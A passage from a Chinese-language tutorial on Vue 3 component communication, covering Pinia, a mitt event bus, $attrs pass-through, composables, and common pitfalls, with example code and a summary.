  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/stores/user'</span>

<span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()

<span class="hljs-keyword">const</span> credentials = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">password</span>: <span class="hljs-string">''</span>
})

<span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
<span class="hljs-keyword">const</span> message = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> messageType = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  message.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>
  
  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> userStore.<span class="hljs-title function_">login</span>(credentials)
  
  <span class="hljs-keyword">if</span> (result.<span class="hljs-property">success</span>) {
    message.<span class="hljs-property">value</span> = <span class="hljs-string">'登录成功！'</span>
    messageType.<span class="hljs-property">value</span> = <span class="hljs-string">'success'</span>
  } <span class="hljs-keyword">else</span> {
    message.<span class="hljs-property">value</span> = <span class="hljs-string">`登录失败：<span class="hljs-subst">${result.error}</span>`</span>
    messageType.<span class="hljs-property">value</span> = <span class="hljs-string">'error'</span>
  }
  
  loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>Pinia</code> 优势：</p>
<ul>
<li>无 mutations，直接修改 state</li>
<li>完美支持 TypeScript</li>
<li>DevTools 调试友好</li>
<li>模块化设计，易于拆分</li>
</ul>
<p><strong>适用场景</strong>：中大型应用，多个组件需要共享复杂状态（如用户登录态、购物车、全局配置）。</p>
<h2 data-id="heading-10">6. 事件总线：轻量级全局通信</h2>
<p>Vue3 移除了实例上的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>n</mi><mtext>、</mtext></mrow><annotation encoding="application/x-tex">on、</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">、</span></span></span></span></span>off 方法，不再支持这种模式，但我们可以使用 mitt 库实现。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils/eventBus.js</span>
<span class="hljs-keyword">import</span> mitt <span class="hljs-keyword">from</span> <span class="hljs-string">'mitt'</span>

<span class="hljs-comment">// 创建全局事件总线</span>
<span class="hljs-keyword">const</span> eventBus = <span class="hljs-title function_">mitt</span>()

<span class="hljs-comment">// 定义事件类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">EVENTS</span> = {
  <span class="hljs-attr">USER_LOGIN</span>: <span class="hljs-string">'user:login'</span>,
  <span class="hljs-attr">USER_LOGOUT</span>: <span class="hljs-string">'user:logout'</span>,
  <span class="hljs-attr">NOTIFICATION_SHOW</span>: <span class="hljs-string">'notification:show'</span>,
  <span class="hljs-attr">MODAL_OPEN</span>: <span class="hljs-string">'modal:open'</span>,
  <span class="hljs-attr">THEME_CHANGE</span>: <span class="hljs-string">'theme:change'</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> eventBus
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 发布事件的组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"publisher"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>事件发布者<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"buttons"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"sendNotification"</span>&gt;</span>发送通知<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"openModal"</span>&gt;</span>打开模态框<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeTheme"</span>&gt;</span>切换主题<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> eventBus, { <span class="hljs-variable constant_">EVENTS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/eventBus'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">sendNotification</span> = (<span class="hljs-params"/>) =&gt; {
  eventBus.<span class="hljs-title function_">emit</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">NOTIFICATION_SHOW</span>, {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'success'</span>,
    <span class="hljs-attr">title</span>: <span class="hljs-string">'操作成功'</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">'这是一个来自事件总线的通知'</span>,
    <span class="hljs-attr">duration</span>: <span class="hljs-number">3000</span>
  })
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">openModal</span> = (<span class="hljs-params"/>) =&gt; {
  eventBus.<span class="hljs-title function_">emit</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">MODAL_OPEN</span>, {
    <span class="hljs-attr">component</span>: <span class="hljs-string">'UserForm'</span>,
    <span class="hljs-attr">props</span>: { <span class="hljs-attr">userId</span>: <span class="hljs-number">123</span> },
    <span class="hljs-attr">title</span>: <span class="hljs-string">'用户表单'</span>
  })
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeTheme</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> themes = [<span class="hljs-string">'light'</span>, <span class="hljs-string">'dark'</span>, <span class="hljs-string">'blue'</span>]
  <span class="hljs-keyword">const</span> randomTheme = themes[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * themes.<span class="hljs-property">length</span>)]
  
  eventBus.<span class="hljs-title function_">emit</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">THEME_CHANGE</span>, {
    <span class="hljs-attr">theme</span>: randomTheme,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
  })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 监听事件的组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"listener"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>事件监听者<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"events-log"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
        <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(event, index) in events"</span> 
        <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>
        <span class="hljs-attr">class</span>=<span class="hljs-string">"event-item"</span>
      &gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>{{ event.type }}<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ event.data }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>{{ event.timestamp }}<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onMounted, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> eventBus, { <span class="hljs-variable constant_">EVENTS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/eventBus'</span>

<span class="hljs-keyword">const</span> events = <span class="hljs-title function_">ref</span>([])

<span class="hljs-comment">// 事件处理函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNotification</span> = (<span class="hljs-params">data</span>) =&gt; {
  events.<span class="hljs-property">value</span>.<span class="hljs-title function_">unshift</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">NOTIFICATION_SHOW</span>,
    <span class="hljs-attr">data</span>: <span class="hljs-string">`通知: <span class="hljs-subst">${data.title}</span> - <span class="hljs-subst">${data.message}</span>`</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toLocaleTimeString</span>()
  })
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleModalOpen</span> = (<span class="hljs-params">data</span>) =&gt; {
  events.<span class="hljs-property">value</span>.<span class="hljs-title function_">unshift</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">MODAL_OPEN</span>,
    <span class="hljs-attr">data</span>: <span class="hljs-string">`打开模态框: <span class="hljs-subst">${data.component}</span>`</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toLocaleTimeString</span>()
  })
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleThemeChange</span> = (<span class="hljs-params">data</span>) =&gt; {
  events.<span class="hljs-property">value</span>.<span class="hljs-title function_">unshift</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">THEME_CHANGE</span>,
    <span class="hljs-attr">data</span>: <span class="hljs-string">`主题切换为: <span class="hljs-subst">${data.theme}</span>`</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toLocaleTimeString</span>()
  })
}

<span class="hljs-comment">// 注册事件监听</span>
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  eventBus.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">NOTIFICATION_SHOW</span>, handleNotification)
  eventBus.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">MODAL_OPEN</span>, handleModalOpen)
  eventBus.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">THEME_CHANGE</span>, handleThemeChange)
})

<span class="hljs-comment">// 组件卸载时移除监听</span>
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  eventBus.<span class="hljs-title function_">off</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">NOTIFICATION_SHOW</span>, handleNotification)
  eventBus.<span class="hljs-title function_">off</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">MODAL_OPEN</span>, handleModalOpen)
  eventBus.<span class="hljs-title function_">off</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">THEME_CHANGE</span>, handleThemeChange)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>不太推荐使用。为什么？</p>
<ul>
<li>数据流向不透明，难以追踪</li>
<li>容易忘记 off 导致内存泄漏</li>
<li>大型项目维护困难</li>
<li>建议：优先用 Pinia 或 provide/inject</li>
</ul>
<p><strong>适用场景</strong>：小型项目中，两个无关联组件需要临时通信（如通知弹窗、模态框控制）。</p>
<hr/>
<h2 data-id="heading-11">7. 属性透传（$attrs）和边界处理</h2>
<p>当你封装一个组件，并希望把未声明的属性自动传递给内部元素时，就用 $attrs。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 基础组件 BaseButton.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
    <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"filteredAttrs"</span>
    <span class="hljs-attr">class</span>=<span class="hljs-string">"base-button"</span>
    @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleClick"</span>
  &gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { computed, useAttrs } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> attrs = <span class="hljs-title function_">useAttrs</span>()

<span class="hljs-comment">// 过滤掉不需要透传的属性</span>
<span class="hljs-keyword">const</span> filteredAttrs = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">class</span>: className, style, ...rest } = attrs
  <span class="hljs-keyword">return</span> rest
})

<span class="hljs-keyword">const</span> emit = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'click'</span>])

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params">event</span>) =&gt; {
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'click'</span>, event)
}

<span class="hljs-comment">// 也可以选择性地暴露 attrs</span>
<span class="hljs-title function_">defineExpose</span>({
  attrs
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 使用基础组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 透传 class、style、data-* 等属性 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">BaseButton</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-btn"</span>
      <span class="hljs-attr">style</span>=<span class="hljs-string">"color: red;"</span>
      <span class="hljs-attr">data-testid</span>=<span class="hljs-string">"submit-button"</span>
      <span class="hljs-attr">title</span>=<span class="hljs-string">"提交按钮"</span>
      @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleSubmit"</span>
    &gt;</span>
      提交表单
    <span class="hljs-tag">&lt;/<span class="hljs-name">BaseButton</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 多个按钮使用相同的基组件 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">BaseButton</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"secondary-btn"</span>
      <span class="hljs-attr">data-testid</span>=<span class="hljs-string">"cancel-button"</span>
      @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleCancel"</span>
    &gt;</span>
      取消
    <span class="hljs-tag">&lt;/<span class="hljs-name">BaseButton</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'提交表单'</span>)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleCancel</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'取消操作'</span>)
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.custom-btn</span> {
  <span class="hljs-attribute">background</span>: blue;
  <span class="hljs-attribute">color</span>: white;
}

<span class="hljs-selector-class">.secondary-btn</span> {
  <span class="hljs-attribute">background</span>: gray;
  <span class="hljs-attribute">color</span>: white;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><strong>特性</strong>：</p>
<ul>
<li>用户传的 class 和 style 会和组件内部的样式合并（Vue 自动处理）。</li>
<li>所有 data-<em>、title、aria-</em> 等原生 HTML 属性都能正常生效。</li>
<li>你不用提前知道用户会传什么，也能支持！</li>
</ul>
<p><strong>适用场景</strong>：封装通用组件（如按钮、输入框），希望保留原生 HTML 属性（class、style、data-* 等）。</p>
<h2 data-id="heading-12">8. 组合式函数：逻辑复用</h2>
<p>对于复杂的通信逻辑，可以使用组合式函数封装。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// composables/useCommunication.js</span>
<span class="hljs-keyword">import</span> { ref, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useCommunication</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> messages = <span class="hljs-title function_">ref</span>([])
  <span class="hljs-keyword">const</span> listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = (<span class="hljs-params">type, data</span>) =&gt; {
    messages.<span class="hljs-property">value</span>.<span class="hljs-title function_">unshift</span>({
      type,
      data,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
    })
    
    <span class="hljs-comment">// 通知监听者</span>
    <span class="hljs-keyword">if</span> (listeners.<span class="hljs-title function_">has</span>(type)) {
      listeners.<span class="hljs-title function_">get</span>(type).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> {
        <span class="hljs-title function_">callback</span>(data)
      })
    }
  }

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onMessage</span> = (<span class="hljs-params">type, callback</span>) =&gt; {
    <span class="hljs-keyword">if</span> (!listeners.<span class="hljs-title function_">has</span>(type)) {
      listeners.<span class="hljs-title function_">set</span>(type, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>())
    }
    listeners.<span class="hljs-title function_">get</span>(type).<span class="hljs-title function_">add</span>(callback)
  }

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">offMessage</span> = (<span class="hljs-params">type, callback</span>) =&gt; {
    <span class="hljs-keyword">if</span> (listeners.<span class="hljs-title function_">has</span>(type)) {
      listeners.<span class="hljs-title function_">get</span>(type).<span class="hljs-title function_">delete</span>(callback)
    }
  }

  <span class="hljs-comment">// 清理函数</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">cleanup</span> = (<span class="hljs-params"/>) =&gt; {
    listeners.<span class="hljs-title function_">clear</span>()
  }

  <span class="hljs-title function_">onUnmounted</span>(cleanup)

  <span class="hljs-keyword">return</span> {
    messages,
    sendMessage,
    onMessage,
    offMessage,
    cleanup
  }
}
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 使用组合式函数 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"communication-demo"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"senders"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">MessageSender</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">EventSender</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"receivers"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">MessageReceiver</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">EventReceiver</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"message-log"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>消息日志<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
        <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(msg, index) in messages"</span> 
        <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>
        <span class="hljs-attr">class</span>=<span class="hljs-string">"log-entry"</span>
      &gt;</span>
        [{{ formatTime(msg.timestamp) }}] {{ msg.type }}: {{ msg.data }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useCommunication } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/composables/useCommunication'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MessageSender</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./MessageSender.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MessageReceiver</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./MessageReceiver.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">EventSender</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./EventSender.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">EventReceiver</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./EventReceiver.vue'</span>

<span class="hljs-keyword">const</span> { messages } = <span class="hljs-title function_">useCommunication</span>()

<span class="hljs-keyword">const</span> <span class="hljs-title function_">formatTime</span> = (<span class="hljs-params">timestamp</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(timestamp).<span class="hljs-title function_">toLocaleTimeString</span>()
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>优势</strong>：</p>
<ul>
<li>逻辑高度复用</li>
<li>类型安全（配合 TS）</li>
<li>易于单元测试</li>
</ul>
<p><strong>适用场景</strong>：将复杂的通信逻辑抽象成可复用的函数，比如 WebSocket 连接、本地存储同步等。</p>
<hr/>
<h2 data-id="heading-13">避坑指南</h2>
<h3 data-id="heading-14">1. Props 设计原则</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 好的 Props 设计</span>
<span class="hljs-title function_">defineProps</span>({
  <span class="hljs-comment">// 必需属性</span>
  <span class="hljs-attr">title</span>: { <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> },
  
  <span class="hljs-comment">// 可选属性带默认值</span>
  <span class="hljs-attr">size</span>: { <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">default</span>: <span class="hljs-string">'medium'</span> },
  
  <span class="hljs-comment">// 复杂对象</span>
  <span class="hljs-attr">user</span>: { 
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">Object</span>, 
    <span class="hljs-attr">default</span>: <span class="hljs-function">() =&gt;</span> ({ <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> }) 
  },
  
  <span class="hljs-comment">// 验证函数</span>
  <span class="hljs-attr">count</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">Number</span>,
    <span class="hljs-attr">validator</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> value &gt;= <span class="hljs-number">0</span> &amp;&amp; value &lt;= <span class="hljs-number">100</span>
  }
})
</code></pre>
<h3 data-id="heading-15">2. 事件命名规范</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用 kebab-case 事件名</span>
<span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'update:title'</span>, <span class="hljs-string">'search-change'</span>, <span class="hljs-string">'form-submit'</span>])

<span class="hljs-comment">// 避免使用驼峰命名</span>
<span class="hljs-comment">// defineEmits(['updateTitle']) // 不推荐</span>
</code></pre>
<h3 data-id="heading-16">3. Provide/Inject 的响应性</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 保持响应性</span>
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">ref</span>({})
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'data'</span>, <span class="hljs-title function_">readonly</span>(data))

<span class="hljs-comment">// 提供修改方法</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateData</span> = (<span class="hljs-params">newData</span>) =&gt; {
  data.<span class="hljs-property">value</span> = { ...data.<span class="hljs-property">value</span>, ...newData }
}
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'updateData'</span>, updateData)
</code></pre>
<h3 data-id="heading-17">4. 内存泄漏预防</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 及时清理事件监听</span>
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  eventBus.<span class="hljs-title function_">off</span>(<span class="hljs-string">'some-event'</span>, handler)
})

<span class="hljs-comment">// 清理定时器</span>
<span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {}, <span class="hljs-number">1000</span>)
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer))
</code></pre>
<hr/>
<h2 data-id="heading-18">总结</h2>
<p>经过上面的详细讲解，相信大家对 Vue3 的组件通信有了更深入的理解。让我最后做个总结：</p>
<ul>
<li>核心原则：根据组件关系选择合适方案</li>
<li>父子组件：优先使用 <code>Props/Emits</code>，简单直接</li>
<li>表单控件：<code>v-model</code>是最佳选择，语法优雅</li>
<li>深层嵌套：<code>Provide/Inject</code> 避免 prop 透传地狱</li>
<li>全局状态：<code>Pinia</code> 专业强大，适合复杂应用</li>
<li>临时通信：事件总线可用但需谨慎</li>
<li>组件封装：属性透传提供更好用户体验</li>
<li>逻辑复用：组合式函数提升代码质量</li>
</ul>
<p>在实际开发中，可以这样：</p>
<ol>
<li>先从 <code>Props/Emits</code> 开始，这是基础</li>
<li>熟练掌握 <code>v-model</code> 的表单处理</li>
<li>在需要时引入 <code>Pinia</code>，不要过度设计</li>
<li>保持代码的可读性和可维护性</li>
</ol>
<p>简单的需求用简单的方案，复杂的需求才需要复杂的工具。</p>
<blockquote>
<p>本文首发于公众号：程序员刘大华，专注分享前后端开发的实战笔记。关注我，少走弯路，一起进步！</p>
</blockquote>
